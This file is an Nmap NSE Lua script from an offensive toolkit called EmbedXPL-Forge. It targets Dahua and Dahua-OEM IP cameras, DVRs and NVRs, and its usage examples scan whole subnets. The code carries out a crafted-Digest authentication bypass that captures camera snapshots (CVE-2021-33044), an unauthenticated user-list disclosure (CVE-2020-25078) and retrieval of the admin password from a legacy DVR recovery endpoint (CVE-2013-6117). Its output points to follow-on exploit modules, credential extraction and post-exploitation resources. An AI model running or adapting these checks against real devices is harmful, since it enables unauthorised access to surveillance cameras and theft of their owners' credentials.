-- embedxpl-dahua-vuln.nse
-- EmbedXPL-Forge NSE Script -- Dahua IP Camera / DVR / NVR CVE Checker
--
-- Author : Andre Henrique (@mrhenrike) | Uniao Geek -- https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: BSD
--
-- DESCRIPTION:
--   Tests Dahua (and OEM-Dahua: Amcrest, Intelbras, TVT, Jovision, ANNKE) devices for:
--     CVE-2021-33044  -- Authentication bypass via crafted HTTP packet (CVSS 9.8)
--     CVE-2020-25078  -- Unauthenticated username disclosure via API
--     CVE-2013-6117   -- DVR password recovery without authentication (legacy)
--
-- USAGE:
--   nmap -p 80,37777 --script embedxpl-dahua-vuln <target>
--   nmap -p 80,443,37777 --script embedxpl-dahua-vuln 192.168.1.0/24
--
-- OUTPUT EXAMPLE:
--   80/tcp open http
--   | embedxpl-dahua-vuln:
--   |   CVE-2021-33044: VULNERABLE -- auth bypass accepted, admin session obtained
--   |   CVE-2020-25078: VULNERABLE -- users=[admin, operator, viewer]
--   |_  EmbedXPL: embedxpl > use exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044

local http   = require "http"
local nmap   = require "nmap"
local stdnse = require "stdnse"
local string = require "string"
local json   = require "json"

description = [[
Tests Dahua IP cameras, DVR, NVR (and Dahua-OEM: Amcrest, Intelbras, TVT, Jovision)
for CVE-2021-33044 (auth bypass), CVE-2020-25078 (user disclosure), and legacy DVR
credential recovery. Suggests EmbedXPL-Forge modules for full exploitation.
]]

author     = "Andre Henrique (@mrhenrike) | Uniao Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "vuln", "exploit", "safe" }

portrule = function(host, port)
  return port.protocol == "tcp" and (
    port.number == 80    or
    port.number == 443   or
    port.number == 8080  or
    port.number == 37777 or
    port.number == 34567
  )
end

local function is_dahua(host, port)
  local resp = http.get(host, port, "/cgi-bin/magicBox.cgi?action=getSystemInfo",
    { timeout = 5000 })
  if resp and resp.status and (resp.status == 200 or resp.status == 401) then
    return true
  end
  -- Try by Server header
  local resp2 = http.get(host, port, "/", { timeout = 4000 })
  if resp2 and resp2.header then
    local srv = resp2.header["server"] or ""
    if srv:match("[Dd]ahua") or srv:match("IPCamera") or srv:match("DH%-") then
      return true
    end
  end
  return false
end

local function check_cve_2021_33044(host, port)
  -- Auth bypass: POST to login with crafted authorization header
  local bypass_headers = {
    ["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8",
    ["Authorization"] = 'Digest username="admin", realm="Login to 0P01B06E6", ' ..
                        'nonce="", uri="/cgi-bin/snapshot.cgi", ' ..
                        'nc=00000001, cnonce="abc", ' ..
                        'response="", opaque=""',
  }
  local resp = http.get(host, port, "/cgi-bin/snapshot.cgi?channel=1",
    { header = bypass_headers, timeout = 8000 })
  if resp then
    local ct = (resp.header and resp.header["content-type"]) or ""
    if resp.status == 200 and ct:match("image/") then
      return "VULNERABLE -- snapshot captured via Digest bypass (CVE-2021-33044, CVSS 9.8)"
    end
    if resp.status == 200 then
      return "LIKELY VULNERABLE -- HTTP 200 returned without valid credentials"
    end
  end
  return "NOT VULNERABLE or patched"
end

local function check_cve_2020_25078(host, port)
  -- Unauthenticated user list via /cgi-bin/userManager.cgi
  local resp = http.get(host, port,
    "/cgi-bin/userManager.cgi?action=getActiveUserInfoAll",
    { timeout = 7000 })
  if resp and resp.status == 200 and resp.body then
    local users = {}
    for user in resp.body:gmatch("UserName=([^\r\n&]+)") do
      table.insert(users, user)
    end
    if #users > 0 then
      return "VULNERABLE -- Users disclosed: [" .. table.concat(users, ", ") .. "]"
    end
    if #resp.body > 20 then
      return "LIKELY VULNERABLE -- Response body returned without auth: " ..
             resp.body:sub(1, 80)
    end
  end
  return "NOT VULNERABLE or patched"
end

local function check_cve_2013_6117(host, port)
  -- Legacy DVR: GET /DVR/PASSWORD_RECOVER
  local resp = http.get(host, port, "/DVR/PASSWORD_RECOVER", { timeout = 5000 })
  if resp and resp.status == 200 and resp.body then
    local pw = resp.body:match("admin:(.-)\n")
    if pw then
      return "VULNERABLE (CVE-2013-6117) -- admin password: " .. pw
    end
    if #resp.body > 5 then
      return "POSSIBLY VULNERABLE (CVE-2013-6117) -- endpoint responds"
    end
  end
  return "NOT VULNERABLE"
end

action = function(host, port)
  if not is_dahua(host, port) then
    return nil
  end

  local output = stdnse.output_table()
  output["Vendor"]          = "Dahua (or Dahua-OEM: Amcrest / Intelbras / TVT)"
  output["CVE-2021-33044"]  = check_cve_2021_33044(host, port)
  output["CVE-2020-25078"]  = check_cve_2020_25078(host, port)
  output["CVE-2013-6117"]   = check_cve_2013_6117(host, port)
  output["EmbedXPL Auth Bypass"]  = "exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044"
  output["EmbedXPL Cred Extract"] = "exploits/cameras/dahua/cctv_37777_credential_extraction"
  output["Run exploit"]           = "embedxpl > use exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044"
  output["Suite"]                 = "pip install embedxpl && embedxpl  |  https://github.com/mrhenrike/EmbedXPL-Forge"
  output["Post-exploitation"]     = "GTFOBins (BusyBox Linux): https://gtfobins.github.io/gtfobins/busybox/"
  return output
end
